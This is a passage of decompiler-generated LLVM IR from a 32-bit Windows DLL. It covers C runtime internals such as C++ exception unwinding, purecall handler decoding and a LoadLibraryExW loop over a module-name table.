  ret void, !insn.addr !8349
}

define i32 @function_1001069e() local_unnamed_addr {
dec_label_pc_1001069e:
  %0 = call i32 @___std_type_info_destroy_list(i32* nonnull @global_var_1003e588), !insn.addr !8350
  ret i32 %0, !insn.addr !8351
}

define i32 @function_100106aa() local_unnamed_addr {
dec_label_pc_100106aa:
  ret i32 ptrtoint (i32* @global_var_1003e590 to i32), !insn.addr !8352
}

define i32 @function_100106b0() local_unnamed_addr {
dec_label_pc_100106b0:
  %0 = call i32 @function_10001100(), !insn.addr !8353
  %1 = add i32 %0, 4, !insn.addr !8354
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8354
  %3 = load i32, i32* %2, align 4, !insn.addr !8354
  %4 = inttoptr i32 %0 to i32*, !insn.addr !8355
  %5 = load i32, i32* %4, align 4, !insn.addr !8355
  %6 = or i32 %5, 4, !insn.addr !8355
  store i32 %6, i32* %4, align 4, !insn.addr !8355
  store i32 %3, i32* %2, align 4, !insn.addr !8356
  %7 = call i32 @function_100106aa(), !insn.addr !8357
  %8 = add i32 %7, 4, !insn.addr !8358
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8358
  %10 = load i32, i32* %9, align 4, !insn.addr !8358
  %11 = inttoptr i32 %7 to i32*, !insn.addr !8359
  %12 = load i32, i32* %11, align 4, !insn.addr !8359
  %13 = or i32 %12, 2, !insn.addr !8359
  store i32 %13, i32* %11, align 4, !insn.addr !8359
  store i32 %10, i32* %9, align 4, !insn.addr !8360
  ret i32 %7, !insn.addr !8361
}

define i32 @function_100106cd() local_unnamed_addr {
dec_label_pc_100106cd:
  ret i32 ptrtoint (i32* @global_var_10040a58 to i32), !insn.addr !8362
}

declare i32 @__RTC_Initialize() local_unnamed_addr

declare i32 @__RTC_Initialize.10() local_unnamed_addr

declare i32 @__chkstk() local_unnamed_addr

define i32 @function_1001093d(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001093d:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !8363
}

declare i32 @__FindAndUnlinkFrame(i32) local_unnamed_addr

declare i32 @__IsExceptionObjectToBeDestroyed(i32) local_unnamed_addr

define i32 @function_10010af5() local_unnamed_addr {
dec_label_pc_10010af5:
  ret i32 1, !insn.addr !8364
}

define i32 @function_10010af8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10010af8:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !8365
}

declare i32 @___CxxFrameHandler() local_unnamed_addr

declare i32 @___std_exception_copy() local_unnamed_addr

declare i32 @___std_exception_destroy(i32, i32, i32) local_unnamed_addr

declare i32* @_memcpy(i32*, i32*, i32) local_unnamed_addr

define i32 @__get_purecall_handler() local_unnamed_addr {
dec_label_pc_10011134:
  %storemerge.reg2mem = alloca i32, !insn.addr !8366
  %0 = load i32, i32* @global_var_1003e5e4, align 4, !insn.addr !8366
  %1 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !8367
  %2 = and i32 %1, 31, !insn.addr !8368
  %3 = xor i32 %1, %0, !insn.addr !8369
  %4 = icmp eq i32 %2, 0, !insn.addr !8370
  store i32 %3, i32* %storemerge.reg2mem, !insn.addr !8370
  br i1 %4, label %10, label %5, !insn.addr !8370

; <label>:5:                                      ; preds = %dec_label_pc_10011134
  %6 = lshr i32 %3, %2, !insn.addr !8370
  %7 = sub nsw i32 32, %2, !insn.addr !8370
  %8 = shl i32 %3, %7, !insn.addr !8370
  %9 = or i32 %8, %6, !insn.addr !8370
  store i32 %9, i32* %storemerge.reg2mem, !insn.addr !8370
  br label %10, !insn.addr !8370

; <label>:10:                                     ; preds = %dec_label_pc_10011134, %5
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  ret i32 %storemerge.reload, !insn.addr !8371
}

declare i32 @___DestructExceptionObject(i32, i32) local_unnamed_addr

define i32 @function_1001136e(i32* %arg1) local_unnamed_addr {
dec_label_pc_1001136e:
  %0 = call i32 @"?ExFilterRethrow@@YAHPAU_EXCEPTION_POINTERS@@@Z"(i32* %arg1), !insn.addr !8372
  ret i32 %0, !insn.addr !8373
}

define i32 @function_10011378() local_unnamed_addr {
dec_label_pc_10011378:
  %eax.0.reg2mem = alloca i32, !insn.addr !8374
  %ebx.1.reg2mem = alloca i32, !insn.addr !8374
  %ecx.0.reg2mem = alloca i32, !insn.addr !8374
  %storemerge.reg2mem = alloca i32, !insn.addr !8374
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -24, !insn.addr !8374
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8374
  %3 = load i32, i32* %2, align 4, !insn.addr !8374
  %4 = call i32 @___vcrt_getptd(), !insn.addr !8375
  %5 = add i32 %4, 32, !insn.addr !8376
  %6 = inttoptr i32 %5 to i32*, !insn.addr !8376
  store i32 0, i32* %6, align 4, !insn.addr !8376
  %7 = add i32 %0, 20, !insn.addr !8377
  %8 = inttoptr i32 %7 to i32*, !insn.addr !8377
  %9 = load i32, i32* %8, align 4, !insn.addr !8377
  %10 = add i32 %0, 12, !insn.addr !8378
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8378
  %12 = load i32, i32* %11, align 4, !insn.addr !8378
  %13 = add i32 %9, 4, !insn.addr !8379
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8379
  %15 = load i32, i32* %14, align 4, !insn.addr !8379
  %16 = icmp sgt i32 %15, 128, !insn.addr !8380
  %17 = add i32 %12, 8
  br i1 %16, label %dec_label_pc_10011399, label %dec_label_pc_10011393, !insn.addr !8380

dec_label_pc_10011393:                            ; preds = %dec_label_pc_10011378
  %18 = inttoptr i32 %17 to i8*, !insn.addr !8381
  %19 = load i8, i8* %18, align 1, !insn.addr !8381
  %20 = sext i8 %19 to i32, !insn.addr !8381
  store i32 %20, i32* %storemerge.reg2mem, !insn.addr !8382
  br label %dec_label_pc_1001139c, !insn.addr !8382

dec_label_pc_10011399:                            ; preds = %dec_label_pc_10011378
  %21 = inttoptr i32 %17 to i32*, !insn.addr !8383
  %22 = load i32, i32* %21, align 4, !insn.addr !8383
  store i32 %22, i32* %storemerge.reg2mem, !insn.addr !8383
  br label %dec_label_pc_1001139c, !insn.addr !8383

dec_label_pc_1001139c:                            ; preds = %dec_label_pc_10011399, %dec_label_pc_10011393
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %23 = add i32 %0, -32, !insn.addr !8384
  %24 = inttoptr i32 %23 to i32*, !insn.addr !8384
  store i32 %storemerge.reload, i32* %24, align 4, !insn.addr !8384
  %25 = add i32 %9, 16, !insn.addr !8385
  %26 = inttoptr i32 %25 to i32*, !insn.addr !8385
  %27 = load i32, i32* %26, align 4, !insn.addr !8385
  %28 = add i32 %0, -40, !insn.addr !8386
  %29 = inttoptr i32 %28 to i32*, !insn.addr !8386
  store i32 0, i32* %29, align 4, !insn.addr !8386
  %30 = add i32 %9, 12, !insn.addr !8387
  %31 = inttoptr i32 %30 to i32*, !insn.addr !8387
  %32 = load i32, i32* %31, align 4, !insn.addr !8387
  %33 = icmp eq i32 %32, 0, !insn.addr !8387
  store i32 %12, i32* %ebx.1.reg2mem, !insn.addr !8388
  store i32 %storemerge.reload, i32* %eax.0.reg2mem, !insn.addr !8388
  br i1 %33, label %dec_label_pc_100113e6, label %dec_label_pc_100113ac.preheader, !insn.addr !8388

dec_label_pc_100113ac.preheader:                  ; preds = %dec_label_pc_1001139c
  %34 = add i32 %0, -36, !insn.addr !8389
  %35 = inttoptr i32 %34 to i32*, !insn.addr !8389
  store i32 0, i32* %ecx.0.reg2mem
  br label %dec_label_pc_100113ac

dec_label_pc_100113ac:                            ; preds = %dec_label_pc_100113ac.preheader, %dec_label_pc_100113dd
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %36 = mul i32 %ecx.0.reload, 20, !insn.addr !8390
  store i32 %36, i32* %35, align 4, !insn.addr !8389
  %37 = add i32 %36, %27
  %38 = add i32 %37, 4, !insn.addr !8391
  %39 = inttoptr i32 %38 to i32*, !insn.addr !8391
  %40 = load i32, i32* %39, align 4, !insn.addr !8391
  %41 = load i32, i32* %11, align 4, !insn.addr !8392
  %42 = icmp sgt i32 %storemerge.reload, %40, !insn.addr !8393
  br i1 %42, label %dec_label_pc_100113bb, label %dec_label_pc_100113dd, !insn.addr !8393

dec_label_pc_100113bb:                            ; preds = %dec_label_pc_100113ac
  %43 = add i32 %37, 8, !insn.addr !8394
  %44 = inttoptr i32 %43 to i32*, !insn.addr !8394
  %45 = load i32, i32* %44, align 4, !insn.addr !8394
  %46 = icmp sgt i32 %storemerge.reload, %45, !insn.addr !8395
  br i1 %46, label %dec_label_pc_100113dd, label %dec_label_pc_100113c7, !insn.addr !8395

dec_label_pc_100113c7:                            ; preds = %dec_label_pc_100113bb
  %47 = add i32 %40, 1, !insn.addr !8396
  store i32 %47, i32* %24, align 4, !insn.addr !8397
  %48 = add i32 %9, 8, !insn.addr !8398
  %49 = inttoptr i32 %48 to i32*, !insn.addr !8398
  %50 = load i32, i32* %49, align 4, !insn.addr !8398
  %51 = mul i32 %47, 8, !insn.addr !8399
  %52 = add i32 %50, %51, !insn.addr !8399
  %53 = inttoptr i32 %52 to i32*, !insn.addr !8399
  %54 = load i32, i32* %53, align 4, !insn.addr !8399
  store i32 %54, i32* %24, align 4, !insn.addr !8400
  store i32 %41, i32* %ebx.1.reg2mem, !insn.addr !8401
  store i32 %54, i32* %eax.0.reg2mem, !insn.addr !8401
  br label %dec_label_pc_100113e6, !insn.addr !8401

dec_label_pc_100113dd:                            ; preds = %dec_label_pc_100113ac, %dec_label_pc_100113bb
  %55 = add nuw i32 %ecx.0.reload, 1, !insn.addr !8402
  store i32 %55, i32* %29, align 4, !insn.addr !8403
  %56 = load i32, i32* %31, align 4, !insn.addr !8404
  %57 = icmp ult i32 %55, %56, !insn.addr !8404
  store i32 %55, i32* %ecx.0.reg2mem, !insn.addr !8405
  store i32 %41, i32* %ebx.1.reg2mem, !insn.addr !8405
  store i32 %storemerge.reload, i32* %eax.0.reg2mem, !insn.addr !8405
  br i1 %57, label %dec_label_pc_100113ac, label %dec_label_pc_100113e6, !insn.addr !8405

dec_label_pc_100113e6:                            ; preds = %dec_label_pc_100113dd, %dec_label_pc_100113c7, %dec_label_pc_1001139c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %58 = add i32 %3, -4, !insn.addr !8406
  %59 = inttoptr i32 %58 to i32*, !insn.addr !8406
  store i32 %eax.0.reload, i32* %59, align 4, !insn.addr !8406
  %60 = add i32 %3, -8, !insn.addr !8407
  %61 = inttoptr i32 %60 to i32*, !insn.addr !8407
  store i32 %9, i32* %61, align 4, !insn.addr !8407
  %62 = add i32 %3, -12, !insn.addr !8408
  %63 = inttoptr i32 %62 to i32*, !insn.addr !8408
  store i32 0, i32* %63, align 4, !insn.addr !8408
  %64 = add i32 %3, -16, !insn.addr !8409
  %65 = inttoptr i32 %64 to i32*, !insn.addr !8409
  store i32 %ebx.1.reload, i32* %65, align 4, !insn.addr !8409
  %66 = call i32 @___FrameUnwindToState(), !insn.addr !8410
  %67 = add i32 %0, -28, !insn.addr !8411
  %68 = inttoptr i32 %67 to i32*, !insn.addr !8411
  store i32 0, i32* %68, align 4, !insn.addr !8411
  %69 = add i32 %0, -4, !insn.addr !8412
  %70 = inttoptr i32 %69 to i32*, !insn.addr !8412
  store i32 0, i32* %70, align 4, !insn.addr !8412
  ret i32 %66, !insn.addr !8413
}

define i32 @function_100113fe() local_unnamed_addr {
dec_label_pc_100113fe:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -4, !insn.addr !8414
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8414
  store i32 -2, i32* %2, align 4, !insn.addr !8414
  %3 = add i32 %0, -64, !insn.addr !8415
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8415
  store i32 0, i32* %4, align 4, !insn.addr !8415
  %5 = call i32 @function_1001141f(), !insn.addr !8416
  %6 = call i32 @__SEH_epilog4(), !insn.addr !8417
  ret i32 %6, !insn.addr !8418
}

define i32 @function_1001141f() local_unnamed_addr {
dec_label_pc_1001141f:
  %eax.0.reg2mem = alloca i32, !insn.addr !8419
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %1, -44, !insn.addr !8419
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8419
  %5 = load i32, i32* %4, align 4, !insn.addr !8419
  %6 = add i32 %2, -4, !insn.addr !8420
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8420
  store i32 %5, i32* %7, align 4, !insn.addr !8420
  %8 = add i32 %1, -48, !insn.addr !8421
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8421
  %10 = load i32, i32* %9, align 4, !insn.addr !8421
  %11 = call i32 @__FindAndUnlinkFrame(i32 %10), !insn.addr !8422
  %12 = call i32 @___vcrt_getptd(), !insn.addr !8423
  %13 = add i32 %1, -52, !insn.addr !8424
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8424
  %15 = load i32, i32* %14, align 4, !insn.addr !8424
  %16 = add i32 %12, 16, !insn.addr !8425
  %17 = inttoptr i32 %16 to i32*, !insn.addr !8425
  store i32 %15, i32* %17, align 4, !insn.addr !8425
  %18 = call i32 @___vcrt_getptd(), !insn.addr !8426
  %19 = add i32 %1, -56, !insn.addr !8427
  %20 = inttoptr i32 %19 to i32*, !insn.addr !8427
  %21 = load i32, i32* %20, align 4, !insn.addr !8427
  %22 = add i32 %18, 20, !insn.addr !8428
  %23 = inttoptr i32 %22 to i32*, !insn.addr !8428
  store i32 %21, i32* %23, align 4, !insn.addr !8428
  %24 = icmp eq i32 %0, -529697949, !insn.addr !8429
  %25 = icmp eq i1 %24, false, !insn.addr !8430
  store i32 %18, i32* %eax.0.reg2mem, !insn.addr !8430
  br i1 %25, label %dec_label_pc_1001149f, label %dec_label_pc_1001144c, !insn.addr !8430

dec_label_pc_1001144c:                            ; preds = %dec_label_pc_1001141f
  %26 = add i32 %0, 16, !insn.addr !8431
  %27 = inttoptr i32 %26 to i32*, !insn.addr !8431
  %28 = load i32, i32* %27, align 4, !insn.addr !8431
  %29 = icmp eq i32 %28, 3, !insn.addr !8431
  %30 = icmp eq i1 %29, false, !insn.addr !8432
  store i32 %18, i32* %eax.0.reg2mem, !insn.addr !8432
  br i1 %30, label %dec_label_pc_1001149f, label %dec_label_pc_10011452, !insn.addr !8432

dec_label_pc_10011452:                            ; preds = %dec_label_pc_1001144c
  %31 = add i32 %0, 20, !insn.addr !8433
  %32 = inttoptr i32 %31 to i32*, !insn.addr !8433
  %33 = load i32, i32* %32, align 4, !insn.addr !8433
  %34 = and i32 %33, -2
  %switch = icmp ne i32 %34, 429065504
  %35 = icmp eq i32 %33, 429065506, !insn.addr !8434
  %36 = icmp eq i1 %35, false, !insn.addr !8435
  %or.cond3 = icmp eq i1 %switch, %36
  store i32 %18, i32* %eax.0.reg2mem
  br i1 %or.cond3, label %dec_label_pc_1001149f, label %dec_label_pc_1001146d

dec_label_pc_1001146d:                            ; preds = %dec_label_pc_10011452
  %37 = add i32 %1, -28, !insn.addr !8436
  %38 = inttoptr i32 %37 to i32*, !insn.addr !8436
  %39 = load i32, i32* %38, align 4, !insn.addr !8436
  %40 = add i32 %1, -60, !insn.addr !8437
  %41 = inttoptr i32 %40 to i32*, !insn.addr !8437
  %42 = load i32, i32* %41, align 4, !insn.addr !8437
  %43 = icmp eq i32 %42, 0, !insn.addr !8437
  %44 = icmp eq i1 %43, false, !insn.addr !8438
  %45 = icmp eq i32 %39, 0, !insn.addr !8439
  %or.cond = or i1 %45, %44
  store i32 %18, i32* %eax.0.reg2mem, !insn.addr !8438
  br i1 %or.cond, label %dec_label_pc_1001149f, label %dec_label_pc_1001147a, !insn.addr !8438

dec_label_pc_1001147a:                            ; preds = %dec_label_pc_1001146d
  %46 = add i32 %0, 24, !insn.addr !8440
  %47 = inttoptr i32 %46 to i32*, !insn.addr !8440
  %48 = load i32, i32* %47, align 4, !insn.addr !8440
  %49 = call i32 @__IsExceptionObjectToBeDestroyed(i32 %48), !insn.addr !8441
  %50 = icmp eq i32 %49, 0, !insn.addr !8442
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !8443
  br i1 %50, label %dec_label_pc_1001149f, label %dec_label_pc_10011487, !insn.addr !8443

dec_label_pc_10011487:                            ; preds = %dec_label_pc_1001147a
  %51 = add i32 %1, -64, !insn.addr !8444
  %52 = inttoptr i32 %51 to i32*, !insn.addr !8444
  %53 = load i32, i32* %52, align 4, !insn.addr !8444
  %54 = icmp eq i32 %53, 0, !insn.addr !8444
  %55 = icmp eq i1 %54, false, !insn.addr !8445
  %56 = zext i1 %55 to i32, !insn.addr !8445
  %57 = call i32 @___DestructExceptionObject(i32 %0, i32 %56), !insn.addr !8446
  store i32 %57, i32* %eax.0.reg2mem, !insn.addr !8447
  br label %dec_label_pc_1001149f, !insn.addr !8447

dec_label_pc_1001149f:                            ; preds = %dec_label_pc_10011452, %dec_label_pc_1001141f, %dec_label_pc_1001144c, %dec_label_pc_10011487, %dec_label_pc_1001147a, %dec_label_pc_1001146d
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !8448
}

define i32 @function_100114d4() local_unnamed_addr {
dec_label_pc_100114d4:
  %0 = call i32 @_terminate(), !insn.addr !8449
  %1 = call i32 @__asm_int3(), !insn.addr !8450
  ret i32 %1, !insn.addr !8450
}

declare i32 @"?ExFilterRethrow@@YAHPAU_EXCEPTION_POINTERS@@@Z"(i32*) local_unnamed_addr

define void @"?_CallMemberFunction0@@YGXQAX0@Z"(i32* %result, i32* %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_10011afd:
  ret void, !insn.addr !8451
}

define i32 @function_10011bab() local_unnamed_addr {
dec_label_pc_10011bab:
  ret i32 1, !insn.addr !8452
}

declare i32 @___FrameUnwindToState() local_unnamed_addr

define i32 @function_10011ddf() local_unnamed_addr {
dec_label_pc_10011ddf:
  %eax.0.reg2mem = alloca i32, !insn.addr !8453
  %0 = call i32 @___vcrt_getptd(), !insn.addr !8453
  %1 = add i32 %0, 24, !insn.addr !8454
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8454
  %3 = load i32, i32* %2, align 4, !insn.addr !8454
  %4 = icmp slt i32 %3, 1, !insn.addr !8455
  store i32 %0, i32* %eax.0.reg2mem, !insn.addr !8455
  br i1 %4, label %dec_label_pc_10011df2, label %dec_label_pc_10011dea, !insn.addr !8455

dec_label_pc_10011dea:                            ; preds = %dec_label_pc_10011ddf
  %5 = call i32 @___vcrt_getptd(), !insn.addr !8456
  %6 = add i32 %5, 24, !insn.addr !8457
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8457
  %8 = load i32, i32* %7, align 4, !insn.addr !8457
  %9 = add i32 %8, -1, !insn.addr !8457
  store i32 %9, i32* %7, align 4, !insn.addr !8457
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !8457
  br label %dec_label_pc_10011df2, !insn.addr !8457

dec_label_pc_10011df2:                            ; preds = %dec_label_pc_10011dea, %dec_label_pc_10011ddf
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !8458
}

define i32 @function_10011f7d() local_unnamed_addr {
dec_label_pc_10011f7d:
  %0 = call i32 @_terminate(), !insn.addr !8459
  ret i32 %0, !insn.addr !8459
}

define i32 @function_10011f82() local_unnamed_addr {
dec_label_pc_10011f82:
  %0 = call i32 @function_10011f8e(), !insn.addr !8460
  %1 = icmp ne i32 %0, 0, !insn.addr !8461
  %2 = zext i1 %1 to i32, !insn.addr !8462
  ret i32 %2, !insn.addr !8463
}

define i32 @function_10011f8e() local_unnamed_addr {
dec_label_pc_10011f8e:
  %0 = call i32 @function_1001471d(), !insn.addr !8464
  %1 = icmp eq i32 %0, 0, !insn.addr !8465
  br i1 %1, label %dec_label_pc_10011f9b, label %dec_label_pc_10011f97, !insn.addr !8466

dec_label_pc_10011f97:                            ; preds = %dec_label_pc_10011f8e
  %2 = add i32 %0, 24, !insn.addr !8467
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8467
  %4 = load i32, i32* %3, align 4, !insn.addr !8467
  ret i32 %4, !insn.addr !8468

dec_label_pc_10011f9b:                            ; preds = %dec_label_pc_10011f8e
  ret i32 0, !insn.addr !8469
}

declare i8* @_strstr(i8*, i8*) local_unnamed_addr

declare i32 @"__CxxThrowException@8"() local_unnamed_addr

declare i32 @_memcpy.12() local_unnamed_addr

declare i32* @_memset(i32*, i32, i32) local_unnamed_addr

define i32 @function_100140da(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100140da:
  %storemerge2.reg2mem = alloca i32, !insn.addr !8470
  %esp.3.reg2mem = alloca i32, !insn.addr !8470
  %esp.2.reg2mem = alloca i32, !insn.addr !8470
  %esi.0.reg2mem = alloca i32, !insn.addr !8470
  %esp.1.reg2mem = alloca i32, !insn.addr !8470
  %esp.04.reg2mem = alloca i32, !insn.addr !8470
  %esp.45.reg2mem = alloca i32, !insn.addr !8470
  %storemerge6.reg2mem = alloca i32, !insn.addr !8470
  %stack_var_-20 = alloca i32, align 4
  %0 = icmp eq i32 %arg1, %arg2, !insn.addr !8471
  %1 = icmp eq i1 %0, false, !insn.addr !8472
  store i32 0, i32* %storemerge2.reg2mem, !insn.addr !8472
  br i1 %1, label %dec_label_pc_100140e9.lr.ph, label %dec_label_pc_10014195, !insn.addr !8472

dec_label_pc_100140e9.lr.ph:                      ; preds = %dec_label_pc_100140da
  %2 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !8473
  store i32 %arg1, i32* %storemerge6.reg2mem
  store i32 %2, i32* %esp.45.reg2mem
  br label %dec_label_pc_100140e9

dec_label_pc_100140e9:                            ; preds = %dec_label_pc_100140e9.lr.ph, %dec_label_pc_10014187
  %esp.45.reload = load i32, i32* %esp.45.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %3 = inttoptr i32 %storemerge6.reload to i32*, !insn.addr !8474
  %4 = load i32, i32* %3, align 4, !insn.addr !8474
  %5 = mul i32 %4, 4, !insn.addr !8475
  %6 = add i32 %5, ptrtoint (i16** @global_var_1003e59c to i32), !insn.addr !8475
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8476
  %8 = load i32, i32* %7, align 4, !insn.addr !8476
  store i32 %esp.45.reload, i32* %esp.3.reg2mem
  store i32 %8, i32* %storemerge2.reg2mem
  switch i32 %8, label %dec_label_pc_10014195 [
    i32 0, label %dec_label_pc_10014106
    i32 -1, label %dec_label_pc_10014187
  ]

dec_label_pc_10014106:                            ; preds = %dec_label_pc_100140e9
  %9 = inttoptr i32 %6 to i16*, !insn.addr !8477
  %10 = add i32 %5, ptrtoint (i32* @global_var_100305bc to i32), !insn.addr !8478
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8478
  %12 = load i32, i32* %11, align 4, !insn.addr !8478
  %13 = add i32 %esp.45.reload, -4, !insn.addr !8479
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8479
  store i32 2048, i32* %14, align 4, !insn.addr !8479
  %15 = add i32 %esp.45.reload, -8, !insn.addr !8480
  %16 = inttoptr i32 %15 to i32*, !insn.addr !8480
  store i32 0, i32* %16, align 4, !insn.addr !8480
  %17 = add i32 %esp.45.reload, -12, !insn.addr !8481
  %18 = inttoptr i32 %17 to i32*, !insn.addr !8481
  store i32 %12, i32* %18, align 4, !insn.addr !8481
  %19 = call i32* @LoadLibraryExW(i16* %9, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !8482
  %20 = ptrtoint i32* %19 to i32, !insn.addr !8482
  %21 = icmp eq i32* %19, null, !insn.addr !8483
  %22 = icmp eq i1 %21, false, !insn.addr !8484
  store i32 %17, i32* %esp.1.reg2mem, !insn.addr !8484
  store i32 %20, i32* %esi.0.reg2mem, !insn.addr !8484
  br i1 %22, label %dec_label_pc_10014171, label %dec_label_pc_10014121, !insn.addr !8484

dec_label_pc_10014121:                            ; preds = %dec_label_pc_10014106
  %23 = call i32 @GetLastError(), !insn.addr !8485
  %24 = icmp eq i32 %23, 87, !insn.addr !8486
  %25 = icmp eq i1 %24, false, !insn.addr !8487
  store i32 %17, i32* %esp.04.reg2mem, !insn.addr !8487
  br i1 %25, label %dec_label_pc_10014167, label %dec_label_pc_1001412c, !insn.addr !8487

dec_label_pc_1001412c:                            ; preds = %dec_label_pc_10014121
  %26 = add i32 %esp.45.reload, -16, !insn.addr !8488
  %27 = inttoptr i32 %26 to i32*, !insn.addr !8488
  store i32 7, i32* %27, align 4, !insn.addr !8488
  %28 = add i32 %esp.45.reload, -20, !insn.addr !8489
  %29 = inttoptr i32 %28 to i32*, !insn.addr !8489
  store i32 ptrtoint ([8 x i16]* @global_var_10030654 to i32), i32* %29, align 4, !insn.addr !8489
  %30 = add i32 %esp.45.reload, -24, !insn.addr !8490
  %31 = inttoptr i32 %30 to i32*, !insn.addr !8490
  store i32 %12, i32* %31, align 4, !insn.addr !8490
  %32 = call i32 @_wcsncmp(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !8491
  %33 = icmp eq i32 %32, 0, !insn.addr !8492
  store i32 %17, i32* %esp.04.reg2mem, !insn.addr !8493
  br i1 %33, label %dec_label_pc_10014167, label %dec_label_pc_10014140, !insn.addr !8493

dec_label_pc_10014140:                            ; preds = %dec_label_pc_1001412c
  store i32 7, i32* %27, align 4, !insn.addr !8494
  store i32 ptrtoint ([8 x i16]* @global_var_10030664 to i32), i32* %29, align 4, !insn.addr !8495
  store i32 %12, i32* %31, align 4, !insn.addr !8496
  %34 = call i32 @_wcsncmp(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !8497
  %35 = icmp eq i32 %34, 0, !insn.addr !8498
  store i32 %17, i32* %esp.04.reg2mem, !insn.addr !8499
  br i1 %35, label %dec_label_pc_10014167, label %dec_label_pc_10014163, !insn.addr !8499

dec_label_pc_10014163:                            ; preds = %dec_label_pc_10014140
  store i32 %20, i32* %27, align 4, !insn.addr !8500
  store i32 %20, i32* %29, align 4, !insn.addr !8501
  store i32 %12, i32* %31, align 4, !insn.addr !8502
  %36 = call i32* @LoadLibraryExW(i16* bitcast (i32* @1 to i16*), i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !8503
  %37 = ptrtoint i32* %36 to i32, !insn.addr !8503
  %38 = icmp eq i32* %36, null, !insn.addr !8504
  %39 = icmp eq i1 %38, false, !insn.addr !8505
  store i32 %30, i32* %esp.04.reg2mem, !insn.addr !8505
  store i32 %30, i32* %esp.1.reg2mem, !insn.addr !8505
  store i32 %37, i32* %esi.0.reg2mem, !insn.addr !8505
  br i1 %39, label %dec_label_pc_10014171, label %dec_label_pc_10014167, !insn.addr !8505

dec_label_pc_10014167:                            ; preds = %dec_label_pc_10014140, %dec_label_pc_1001412c, %dec_label_pc_10014121, %dec_label_pc_10014163
  %esp.04.reload = load i32, i32* %esp.04.reg2mem
  store i32 -1, i32* %7, align 4, !insn.addr !8506
  store i32 %esp.04.reload, i32* %esp.3.reg2mem, !insn.addr !8507
  br label %dec_label_pc_10014187, !insn.addr !8507

dec_label_pc_10014171:                            ; preds = %dec_label_pc_10014163, %dec_label_pc_10014106
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = load i32, i32* %7, align 4, !insn.addr !8508
  store i32 %esi.0.reload, i32* %7, align 4, !insn.addr !8508
  %41 = icmp eq i32 %40, 0, !insn.addr !8509
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !8510
  br i1 %41, label %dec_label_pc_10014183, label %dec_label_pc_1001417c, !insn.addr !8510

dec_label_pc_1001417c:                            ; preds = %dec_label_pc_10014171
  %42 = add i32 %esp.1.reload, -4, !insn.addr !8511
  %43 = inttoptr i32 %42 to i32*, !insn.addr !8511
  store i32 %esi.0.reload, i32* %43, align 4, !insn.addr !8511
  %44 = call i1 @FreeLibrary(i32* nonnull @1), !insn.addr !8512
  store i32 %42, i32* %esp.2.reg2mem, !insn.addr !8512
  br label %dec_label_pc_10014183, !insn.addr !8512

dec_label_pc_10014183:                            ; preds = %dec_label_pc_1001417c, %dec_label_pc_10014171
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %45 = icmp eq i32 %esi.0.reload, 0, !insn.addr !8513
  %46 = icmp eq i1 %45, false, !insn.addr !8514
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !8514
  store i32 %esi.0.reload, i32* %storemerge2.reg2mem, !insn.addr !8514
  br i1 %46, label %dec_label_pc_10014195, label %dec_label_pc_10014187, !insn.addr !8514

dec_label_pc_10014187:                            ; preds = %dec_label_pc_100140e9, %dec_label_pc_10014183, %dec_label_pc_10014167
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %47 = add i32 %storemerge6.reload, 4, !insn.addr !8515
  %48 = icmp eq i32 %47, %arg2, !insn.addr !8471
  %49 = icmp eq i1 %48, false, !insn.addr !8472
  store i32 %47, i32* %storemerge6.reg2mem, !insn.addr !8472
  store i32 %esp.3.reload, i32* %esp.45.reg2mem, !insn.addr !8472
  store i32 0, i32* %storemerge2.reg2mem, !insn.addr !8472
